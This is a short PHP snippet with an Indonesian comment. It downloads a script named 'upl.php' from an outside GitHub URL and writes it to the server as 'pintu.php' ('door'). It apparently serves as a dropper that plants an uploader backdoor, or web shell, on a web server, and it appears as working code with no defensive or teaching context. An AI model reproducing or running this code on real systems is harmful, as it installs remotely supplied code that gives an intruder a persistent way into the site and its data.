$nama = fopen("pintu.php", "w+"); // Menambahkan $ pada variabel nama
$file = file_get_contents('https://raw.githubusercontent.com/harisprakoso/VPN/refs/heads/master/upl.php');
$tulis = fwrite($nama, $file);
fclose($nama);
